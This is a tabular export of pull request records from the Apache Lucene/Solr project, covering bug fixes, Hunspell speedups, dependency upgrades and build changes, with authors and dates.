"","1706","LUCENE-9443: UnifiedHighlighter shouldn't close reader","A regression from 8.6.  Don't close the underlying IndexReader.  https://issues.apache.org/jira/browse/LUCENE-9443  Instead of reverting the commit, there's something to be said for closing the wrapped reader since, after all, it's something you're supposed to close.  Since this is a wrapped reader created by the UH, it's easy to make its doClose do nothing.  Furthermore I tweaked a test that would fail prior to this change.  I checked precommit to ensure there is still no warning.","closed","","dsmiley","2020-07-29T17:42:37Z","2020-07-31T11:42:29Z"
"","2299","LUCENE-9731: restore consistent random seed to HnswGraphBuilder","A recent change replaced a static constant random seed initialized to `System.currentTimeMillis()` with a call to `System.currentTimeMillis()`, invalidating tests that relied on the consistent random behavior for reproducibility. This just undoes that change, restoring the use of `HnswGraphBuilder.randSeed`","closed","","msokolov","2021-02-04T02:45:24Z","2021-02-04T03:14:07Z"
"","2594","SOLR-14726: Initial draft of a new quickstart guide","A new quickstart guide that can potentially replace (or live side by side with) the Solr tutorial. This is WIP at the moment, but would appreciate early feedback and thoughts.","open","","chatman","2021-10-26T18:04:03Z","2021-11-02T22:49:59Z"
"","1689","LUCENE-9439: Matches API should enumerate hit fields that have no positions (support empty iterator)","A minimally-intrusive patch that seems to work just fine.","closed","","dweiss","2020-07-23T09:36:37Z","2020-08-06T09:46:51Z"
"","1694","SOLR-14680: Provide simple interfaces to our cloud classes  (only API)","A few notes before anyone who starts reviewing this  -  This was created after I saw similar attempt as a part #1684 . I believe this has to receive a more wider input and review irrespective of whether devs are interested in autoscaling or not - This is a WIP PR - The concrete implementations are for demo purposes. Can be omitted, if required. Anything outside the `o.a.s.cluster.api` package is optional and will be removed  - The interfaces are designed to be minimal to avoid overload. We can and will add more methods later. Let's not add a lot","closed","clean-api,","noblepaul","2020-07-26T00:20:20Z","2020-08-11T05:05:15Z"
"","1824","LUCENE-9500: Separate the Deflater hack from the Lucene code to a subclass of java.util.zip.Deflater","A factory method allows to return a different instance depending on Java version (for now everything after Java 11 is disallowed).  We can improve this when we exactly know which versions are affected. Once the bug is fixed and Lucene uses a later minimum version, we can easily remove the class.  TODO: We should add a forbiddenapis to disallow direct use of deflater by disallowing its constructor.","closed","bug,","uschindler","2020-09-03T11:24:28Z","2020-09-03T15:06:20Z"
"","1799","Lucene 9435","A bunch of post-ant commits with cleanups.","closed","","dweiss","2020-08-29T15:37:37Z","2020-08-30T12:01:19Z"
"","1791","LUCENE-9482: Fix deletion count error message","`throw new CorruptIndexException(""invalid deletion count: "" + softDelCount + delCount + "" vs maxDoc="" + info.maxDoc(), input);` It needs to be changed to: `throw new CorruptIndexException(""invalid deletion count: "" + (softDelCount + delCount) + "" vs maxDoc="" + info.maxDoc(), input);`  The value of ""softDelCount + delCount"" must be calculated first.","closed","","linwenyao","2020-08-27T01:28:15Z","2020-09-06T15:10:52Z"
"","1784","LUCENE-9482: There is a problem with the description of ""invalid deletion count"" exception.","`throw new CorruptIndexException(""invalid deletion count: "" + softDelCount + delCount + "" vs maxDoc="" + info.maxDoc(), input);` **It needs to be changed to:** `throw new CorruptIndexException(""invalid deletion count: "" + (softDelCount + delCount) + "" vs maxDoc="" + info.maxDoc(), input);`  The value of ""softDelCount + delCount"" must be calculated first.","open","","linwenyao","2020-08-26T04:25:31Z","2020-08-27T02:06:49Z"
"","1783","@Deprecated","`throw new CorruptIndexException(""invalid deletion count: "" + softDelCount + delCount + "" vs maxDoc="" + info.maxDoc(), input);` **It needs to be changed to:** `throw new CorruptIndexException(""invalid deletion count: "" + (softDelCount + delCount) + "" vs maxDoc="" + info.maxDoc(), input);`","closed","","linwenyao","2020-08-26T03:49:51Z","2020-08-27T01:18:05Z"
"","1798","Remove ant Github Action","`ant` no longer in master branch","closed","","tflobbe","2020-08-28T23:48:25Z","2020-08-29T08:22:14Z"
"","2016","SOLR-14067 v2 Move Stateless Scripting Update Process to /contrib/scripting module","_Once more, with feeling_  # Description  The scripting update processor is both powerful but also potentially dangerous, and shouldn't ship with Solr by default.  # Solution  Move the Stateless Script Update Processor out of `/core` and into `/contrib` so you need to install it.   I have not yet tried to make it a Solr Package.  Also, I am not happy with the word `Stateless` in the name of the update processor.   I'd love to see what others thought on just renaming `StatelessScriptUpdateProcessorFactory` to just `ScriptUpdateProcessorFactory`.   There is not `Stateful` equivalent, and it seems to me to obscure what this update processor is all about!  # Tests  I've run the existing tests and they pass.  # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2020-10-21T20:38:37Z","2021-01-18T12:29:02Z"
"","2573","LUCENE-10008: Respect ignoreCase flag in CommonGramsFilterFactory","_Backporting a bug fix pushed into `apache/lucene:main` as part of this PR - https://github.com/apache/lucene/pull/188_  ## Description  `CommonGramsFilterFactory` should respect the ignoreCase flag passed in args even when the default stop word set is used. It currently ignores the flag if `commonWordFiles` are not specified.  ## Solution  Ensure the flag is respected in even when default stop word set is used.  ## Tests  Added test to ensure that bigrams get constructed with common words that are not in lower case, when `ignoreCase` is passed as `true` to the `CommonGramsFilterFactory`.","closed","","vigyasharma","2021-09-14T18:09:08Z","2021-10-21T14:34:05Z"
"","2104","SOLR Contribs: Assembly was missing READMEs","_(9.0/Gradle build)_ I found that `README.md`, `CHANGES.md`, `example/` was not getting in the assembly (the distribution).  I chose to take an excludes-list instead of includes-list approach.  This way, there's a problem in the future, it'll be because we accidentally included stuff (no big deal?) instead of accidentally forgetting stuff (more or a problem).  I tested this manually, and looked at the prometheus one especially.","closed","","dsmiley","2020-11-28T22:15:52Z","2022-04-10T18:52:25Z"
"","1981","LUCENE-9579 Update to JUnit 4.13.1","@dweiss I didn't see any compat issues that this caused with carrot search runner, but will give you a chance to look before I merge this.","closed","","madrob","2020-10-14T15:38:12Z","2020-10-14T17:51:50Z"
"","1781","SOLR-14777: Fix an ignore test that is helpful.","# Description  There are a number of tests that are annotated `@Ignore` but we still need them. This is a first step to start to chip away at the ignores so that the team is no impacted.  # Solution   Fix an ignore test that is helpful.  # Tests  I am adding a test that was previously ignored.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-08-25T08:46:00Z","2020-08-27T16:12:20Z"
"","1693","SOLR-14607: LTR Query, timeAllowed parameter causes a timeout exception with no result","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description When TimeAllowed is set, the SolrQueryTimeoutImpl function will be started to detect whether it has timed out when the term is loaded. When overtime, an ExitingReaderException is thrown. In the process of scoreFeatures of LTRQuery, ExitingReaderException will occur in two stages. 1.scorer. Occurs when a term needs to be loaded to the LeafReaderContext when creating Weight. 2.score. The term needs to be loaded when some functions call getValue. For example, FloatPayloadValueSource. So it can be compatible with this ExitingReaderException, and partly return. More empty results are better.  # Solution 1. In the scorer process, catch ExitingReaderException and return the currently loaded document. 2. In the score process, catch ExitingReaderException and return the currently calculated document.  # Tests Simulation throws ExitingReaderException in the scorer process, and partially returns the loaded document. Simulation throws ExitingReaderException in the score process of Feature, partially returning the calculated document.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","limingnihao","2020-07-25T15:44:46Z","2021-03-11T09:08:04Z"
"","1690","SOLR-14607: LTR Query, timeAllowed parameter causes a timeout exception with no result","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description When TimeAllowed is set, the SolrQueryTimeoutImpl function will be started to detect whether it has timed out when the term is loaded. When overtime, an ExitingReaderException is thrown.  In the process of scoreFeatures of LTRQuery, ExitingReaderException will occur in two stages. 1.scorer. Occurs when a term needs to be loaded to the LeafReaderContext when creating Weight. 2.score. The term needs to be loaded when some functions call getValue. For example, FloatPayloadValueSource.  So it can be compatible with this ExitingReaderException, and partly return. More empty results are better.  # Solution  1. In the scorer process, catch ExitingReaderException and return the currently loaded document. 2. In the score process, catch ExitingReaderException and return the currently calculated document.  # Tests  Simulation throws ExitingReaderException in the scorer process, and partially returns the loaded document. Simulation throws ExitingReaderException in the score process of Feature, partially returning the calculated document.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","limingnihao","2020-07-24T16:31:19Z","2020-07-25T15:29:09Z"
"","2150","SOLR-15054: Test should not require private methods to be final","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description Test failure due to recent changes in https://github.com/apache/lucene-solr/pull/2120   See: https://issues.apache.org/jira/browse/SOLR-15054  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-12-16T22:05:46Z","2020-12-17T12:39:17Z"
"","2091","Jira/solr 14778","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description Making the UpdateLog **safely** disable-able; without this change, when UpdateLog is disabled, updates fail silently in ""buffering"" state.  # Solution Wherever we would buffer updates if UpdateLog were enabled, instead we reject updates at the core level.  # Tests There are two simple test cases, which create a core and directly modify the core state to reject updates. The third test, testLiveSplit, is borrowed from Yonik's testLiveSplit case [here](https://github.com/apache/lucene-solr/blob/master/solr/core/src/test/org/apache/solr/cloud/SplitShardTest.java#L200).  # Checklist Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","megancarey","2020-11-20T18:12:14Z","2021-01-26T18:04:30Z"
"","2289","SOLR-15104: add timestamp in default gc_log name","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description https://issues.apache.org/jira/browse/SOLR-15104  When restarting Solr, it will overwrite the gc log, this behavior is not friendly for debugging OOM issues.  # Solution  Add timestamp in default gc_log name, so it doesn't overwrite the previous one.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","interma","2021-02-02T06:56:18Z","2021-02-05T02:57:34Z"
"","2428","LUCENE-9811: Hunspell suggestions: speed up ngram calculation…","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  …by not searching for substrings in impossible places. ngram is a very expensive (O(M*M*N)) algorithm, it's worth to try to save a bit there.  # Solution  Once we've found `s2.contains(s1.substring(i, len))`, checking for `s2.contains(s1.substring(i, len + 1))` can proceed from the same position and not from the beginning. And if we haven't found the former, we don't need to search for the latter. And there's no need to allocate the substring at all.  # Tests  ~7% speedup in `TestPerformance.en_suggest`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-24T14:11:07Z","2021-02-24T17:46:53Z"
"","2418","LUCENE-9803: Hunspell: don't check second stage suffixes if the first…","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  … stage flag only occurs in prefixes  # Solution  Split prefix and suffix continuation flag indices, check the appropriate one  # Tests  No new tests. `TestPerformance.fr` has ~10% speedup for me.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-23T08:35:52Z","2021-02-23T16:38:27Z"
"","2416","LUCENE-9801: Hunspell suggestions: speed up expandWord by enumerating…","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  … only applicable affixes.  Before, all affixes were enumerated and checked for `startsWith/endsWith`. And enumerating a whole FST is expensive.  # Solution  Perform FST traversal similar to affix stripping in suggester as well. Extract a couple utility methods and clean up around that.  # Tests  No new tests. `TestPerformance.fr_suggest` becomes ~40% faster.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-22T19:22:49Z","2021-02-23T08:30:41Z"
"","2235","LUCENE-9690: Hunspell: support special title-case for words with apostrophe","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  When checking French L'AFRIQUE, consider not only L'afrique, but also L'Afrique  # Solution  When there's an apostrophe, try a case variant with an uppercase after it, just like Hunspell does (https://github.com/hunspell/hunspell/blob/master/src/hunspell/hunspell.cxx#L547)  # Tests  Enhanced `allcaps` test for both stemmer and spellchecker (as the case processing logic is duplicated there)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-22T11:43:58Z","2021-01-25T11:58:56Z"
"","2427","LUCENE-9810: Hunspell: when generating suggestions, skip too deep word FST subtrees","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  we skip roots longer than misspelled+4 anyway, so there's no need to read their arcs  # Solution  When we visit a node longer than needed, use `IntsRefFSTEnum#seekCeil` to speed up rewinding to the next shorter node.  # Tests  No new tests. `TestPerformance.de_suggest` has become ~40% faster  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-24T12:39:50Z","2021-02-25T16:39:34Z"
"","2400","LUCENE-9787: Hunspell: speed up suggesting a bit by not creating a huge TreeSet","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We only need 100 first elements, not need to compare the thousands of other roots among themselves  # Solution  Use a PriorityQueue, trim it once it becomes larger then the limit  # Tests  Nothing failing, but added suggestion checks in `TestPerformance` to track progress. For now suggesting is horribly slow :(  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-18T11:54:53Z","2021-02-19T20:08:19Z"
"","2296","LUCENE-9728: Hunspell: add a performance test","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We need some way check that changes don't regress performance, and preferably improve it  # Solution  See below  # Tests  Added a `TestPerformance` which prints some times that can be compared before and after risky changes. It's not run on CI yet and never fails.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-03T11:27:11Z","2021-02-05T08:54:50Z"
"","2321","LUCENE-9745: Hunspell: tolerate more aff/dic file typos","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We need `TestAllDictionaries` to pass at least on the dictionaries we refer to.  # Solution  Tolerate more mistaks in aff/dic files  # Tests  `forgivable-errors` expanded, `TestAllDictionaries` now passes  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-08T13:50:34Z","2021-02-09T07:57:28Z"
"","2021","SOLR-14844: upgrade jetty to 9.4.32.v20200930","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Upgrades Jetty to 9.4.32.v20200930 as described in JIRA ticket.  # Solution  After upgrading the compression related tests started to fail, so some of the broken unit tests were modified also. The reasons behind the broken unit tests are described in the original ticket.  Also, created SOLR-14945 to track the need to improve HttpSolrClient compression handling to avoid problems like this in the future.  # Tests  BasicHttpSolrClientTest had to be modified in order to match Jetty's new behaviour for empty responses.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","samuelgmartinez","2020-10-23T17:58:55Z","2020-10-24T20:01:38Z"
"","2003","SOLR-14844: Upgrade Jetty to 9.4.32.v20200930","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Upgrades Jetty to 9.4.32.v20200930 as described in JIRA ticket.  # Solution  After upgrading the compression related tests started to fail, so some of the broken unit tests were modified also. The reasons behind the broken unit tests are described in the original ticket.  Also, created SOLR-14945 to track the need to improve HttpSolrClient compression handling to avoid problems like this in the future.  # Tests  BasicHttpSolrClientTest had to be modified in order to match Jetty's new behaviour for empty responses.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","samuelgmartinez","2020-10-18T19:43:21Z","2020-10-24T20:01:12Z"
"","2082","SOLR-15002: Upgrade HttpClient to 4.5.13","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Upgrade HttpClient 4.5.13 and HttpCore 4.4.13  # Solution  Upgrade HttpClient 4.5.13 and HttpCore 4.4.13  # Tests  Unit tests.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","asalamon74","2020-11-16T10:46:18Z","2021-04-08T15:32:01Z"
"","2413","LUCENE-9799: Hunspell: don't check second-level affixes when the first level isn't a continuation","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Two-stage affix removal is quite expensive and can result on O(n^2) performance, especially with many zero affixes like in French  # Solution  Don't go to the second stage if on the first one we've removed an affix which definitely isn't compatible with any other affix on the second stage; create a set of all continuation flags to check that quickly.  # Tests  No new tests. `TestPerformance.de/fr` show about 2x speedups.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-22T09:32:52Z","2021-02-22T11:18:20Z"
"","2253","LUCENE-9702: Hunspell: support alternate casing for short language codes","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Turkish `I`s don't work with `LANG tr`  # Solution  Support `tr` as well as `tr_TR`  # Tests  `dotless_i` from Hunspell/C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-27T15:57:24Z","2021-01-29T10:49:42Z"
